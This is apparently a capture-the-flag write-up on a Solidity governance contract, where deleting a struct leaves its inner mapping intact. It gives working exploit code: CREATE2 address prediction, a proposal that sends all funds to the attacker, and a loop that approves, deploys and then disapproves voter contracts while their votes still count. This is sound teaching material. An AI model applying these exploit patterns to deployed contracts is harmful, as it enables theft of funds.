This vulnerability exposes a flaw in the governance system, allowing for exploitation by malicious actors.

The vulnerability stems from the incorrect clearing of mappings inside structs when using the `delete` keyword. In this case, the flaw occurs in the `deposeViceroy` function of the `Governance` contract.

```solidity
function deposeViceroy(address viceroy, uint256 id) external {
    require(oligargyNFT.ownerOf(id) == msg.sender, "Not an oligarch");
    require(viceroys[viceroy].appointedBy == id, "Only the appointer can depose");

    idUsed[id] = false;
    delete viceroys[viceroy]; // The flaw: Mappings inside the struct are not cleared
}
```

The attacker predicts the address of the `ViceroyAttacker` contract by combining the contract's bytecode with encoded data and hashing it.

```solidity
// Address Prediction
bytes memory bytecode = type(ViceroyAttacker).creationCode;
bytecode = abi.encodePacked(
    bytecode,
    abi.encode(_governance, player, _communityWallet)
);
bytes32 hash = keccak256(
    abi.encodePacked(
        bytes1(0xff),
        address(this),
        uint(123),
        keccak256(bytecode)
    )
);
address deployedAddr = address(uint160(uint(hash)));
```

The attacker appoints the predicted viceroy address as the viceroy, gaining control over approving voters.

```solidity
// Creating a Malicious Proposal
bytes memory data = abi.encodeWithSignature(
    "exec(address,bytes,uint256)", // will transfer balance to player
    _player, // player address
    "0x", // not needed to transfer balance
    value
);
Governance(_governance).createProposal(_player, data);

```

The attacker creates a malicious proposal, including data that will transfer all funds to their account when executed.

```solidity
// Attack loop
while (attackCounter < 11) {
    // Get the bytecode for the contract to be deployed.
    // This contract is the VoterAttacker, which is responsible for voting on the proposal.
    bytes memory bytecode = type(VoterAttacker).creationCode;

    // Encode the bytecode along with the necessary parameters.
    bytecode = abi.encodePacked(
        bytecode,
        abi.encode(_governance, proposalId, address(this))
    );

    // Predict the deployment address using the encoded bytecode and salt (attackCounter).
    bytes32 hash = keccak256(
        abi.encodePacked(
            bytes1(0xff),
            address(this),
            attackCounter,
            keccak256(bytecode)
        )
    );
    address deployedAddr = address(uint160(uint(hash)));

    // Use the Viceroy's authority to approve the voter at the predicted address.
    governance.approveVoter(deployedAddr);

    // Deploy the VoterAttacker contract at the predicted address.
    new VoterAttacker{salt: bytes32(attackCounter)}(
        _governance,
        proposalId,
        address(this)
    );

    // Disapprove the voter right after they've cast their vote.
    // This creates a loophole where the voter is disapproved but their vote still counts.
    governance.disapproveVoter(deployedAddr);

    // Increment the attack counter, which also serves as the salt for the next iteration.
    attackCounter++;
}

```
